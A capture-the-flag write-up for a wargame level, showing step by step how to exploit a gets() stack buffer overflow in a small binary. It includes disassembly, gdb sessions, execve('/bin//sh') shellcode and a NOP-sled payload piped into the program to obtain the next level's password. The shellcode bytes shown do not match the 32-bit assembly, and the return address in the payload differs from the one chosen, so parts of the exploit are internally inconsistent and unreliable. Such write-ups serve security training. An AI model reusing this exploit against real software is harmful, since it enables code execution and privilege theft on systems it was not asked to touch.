# level01 - Buffer Overflow

On `level0`'s HOME, we find a binary named : `level0`

let's disassemble the `main` function of this binary:

```shell
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

As we see, a buffer of 40 is allocate on the stack of and passed as argument to `gets()`.
The function `gets()` read on stdin and don't check if the input buffer is big
enough to hold the string. So it's a simple BOF.
So let's exploit it !

<br>

We break on `gets()` call to find the right offset (on the
target machine)
```shell
(gdb) b *0x8048490
Breakpoint 1 at 0x8048490
(gdb) r <<< $(python -c "print 'A' * 100")
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 100")

Breakpoint 1, 0x08048490 in main ()
(gdb) x/x $esp+0x10
0xbffff6e0:	0x080484a0
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048490 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff728, args:
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c

```

So from value between the begin of buffer and `eip`, we compute an offset of 76
bytes. This knowing, we just have to rewrite `eip` to point to an emplacement on
the buffer where is our crafted shellcode.

<br>

This is our crafted shellcode (on our machine):
```shell
>$ cat /tmp/exploit1.s
_start:
    xor eax, eax        ; set eax to 0
    xor edx, edx        ; set env to NULL
    mov al, 11          ; execve syscall number
    push edx            ; push NULL string terminator
    mov ebx, '//sh'     ; first arg to /bin/sh
    push ebx            ; push to stack
    mov ebx, '/bin'     ; first arg to /bin/sh
    push ebx            ; push to stack
    mov edi, esp        ; move pointer to ['/bin//sh']
    push edx            ; push NULL string terminator
    push ebx            ; push second arg to ['/bin//sh']
    mov ecx, esp        ; pointer to args
	int    0x80
```

After compile it, let's extract the shellcode (on our machine):
```shell
(cd /tmp && nasm -f elf exploit1.s && ld -m elf_i386 -o exploit1 exploit1.o)
count=0; for i in $(objdump -d /tmp/exploit1 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```

We get now our shellcode in well form with his length:
```shell
[SNIP]
\xb0\x3b\x31\xd2\x52\xbf\x2f\x2f\x73\x68\x57\xbf\x2f\x62\x69\x6e\x57\x89\xe7\x52\x57\x89\xe6\x0f\x05
25 bytes
```

<br>

Perfect, to exploit we need to find the new `eip` address value.
Let's test it with gdb to retrieve it (on the target machine):
```shell
(gdb) b *0x08048495
Breakpoint 1 at 0x8048495
(gdb) r <<< $(python -c "print 'A' * 80")
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 80")

Breakpoint 1, 0x08048495 in main ()
(gdb) x/30x $esp
0xbffff6d0:	0xbffff6e0	0x0000002f	0xbffff72c	0xb7fd0ff4
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0x00000000	0xbffff7c4	0xbffff7cc	0xb7fdc858
0xbffff740:	0x00000000	0xbffff71c
```
So we will choose `0xbffff6f0` as `eip` value.

<br>

To summary, we have:
- An offset of **76 bytes** before `eip`
- A shellcode with a length of **25 bytes**
- The new address of `eip` : **0xbffff6f0**

<br>

So our payload (using python) will be:
- NOP instruction -> `\x90` * 51 
- Our shellcode -> `\xb0\x3b\x31\xd2\x52\xbf\x2f\x2f\x73\x68\x57\xbf\x2f\x62\x69\x6e\x57\x89\xe7\x52\x57\x89\xe6\x0f\x05`
- New `eip` address : `\xbf\xff\f6\e0`


We can know exploit this BOF :

```shell
echo $(python -c "print '\x90' * 51 +  '\xb0\x3b\x31\xd2\x52\xbf\x2f\x2f\x73\x68\x57\xbf\x2f\x62\x69\x6e\x57\x89\xe7\x52\x57\x89\xe6\x0f\x05' + '\xbf\xff\xf6\xe0'[::-1]") | ./level1
```

Perfect, we got the `level1`'s password !
